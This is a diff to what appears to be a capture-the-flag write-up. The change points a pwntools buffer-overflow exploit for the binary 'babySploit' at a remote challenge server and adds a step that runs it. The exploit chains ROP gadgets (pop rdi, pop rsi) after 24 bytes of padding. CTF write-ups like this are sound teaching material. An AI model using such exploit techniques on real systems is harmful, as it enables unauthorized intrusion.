@@ -82,8 +82,8 @@ from pwn import *
 exe = ELF('./babySploit')
 context.binary = exe
 
-# p = remote('78.40.108.21', 1338)
-p = gdb.debug('./babySploit', '''continue''')
+p = remote('78.40.108.21', 1338)
+# p = gdb.debug('./babySploit', '''continue''')
 
 pop_rdi = 0x401196
 pop_rsi = 0x401198
@@ -92,6 +92,14 @@ p.sendline(b'A' * 24 + p64(pop_rdi) + p64(0xdeadbeefdeadbeef) + p64(pop_rsi) + p
 
 p.interactive()
 ```
+
+Check:    
+
+```bash
+python3 babysploit.py
+```
+
+![img](./img/2024-03-17_17-17.png)    
 
 Flag:    
 
